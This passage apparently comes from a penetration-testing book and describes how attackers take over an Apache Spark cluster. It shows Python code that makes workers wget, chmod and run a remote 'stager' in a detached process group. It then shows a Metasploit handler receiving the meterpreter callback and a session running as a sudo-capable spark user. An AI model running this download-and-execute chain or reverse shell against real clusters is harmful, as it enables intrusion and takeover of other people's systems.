  md: "# Spark Takeover\n\nTo keep our malicious app in play, we want to diligently\
    \ instruct Linux to spawn it in its own process group, in order to ignore interrupt\
    \ signals sent by the JVM when the job is done. We also want the driver to wait\
    \ a few seconds, until our app finishes establishing a stable connection to our\
    \ attacking infrastructure. We need to add these lines to our app:\n\n```\n--snip--\n\
    finalist = partlist.map(\n    lambda x: subprocess.Popen(\n        \"wget https://gretsch-spark-eu.s3.amazonaws.com/stager\
    \ && chmod +x ./stager && ./stager &\",\n        shell=True,\n        preexec_fn=os.setpgrp,\n\
    \    )\n)\nfinalist.collect()\ntime.sleep(10)\n\n$ python reverse_app.py\n--snip--\n\
    ```\n\nOn our attacking infrastructure, we open Metasploit and wait for the app\
    \ to ring back home:\n\n```\n[*] https://0.0.0.0:443 handling request from...\n\
    [*] https://0.0.0.0:443 handling request from...\nmsf exploit(multi/handler) >\
    \ sessions -i 7\n[*] Starting interaction with 7...\n\nmeterpreter > execute -i\
    \ -f id\nProcess 4638 created.\nChannel 1 created.\n\n① uid=1000(spark) gid=1000(spark)\n\
    groups=1000(spark),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadm\
    \ in),116(sambashare)...\n```\n\nFantastic! We made it to one of the workers.\
    \ We’re running as a regular Spark user ①, which was trusted enough to be included\
    \ in the sudo group. No complaints from this side of the screen. Let’s explore\
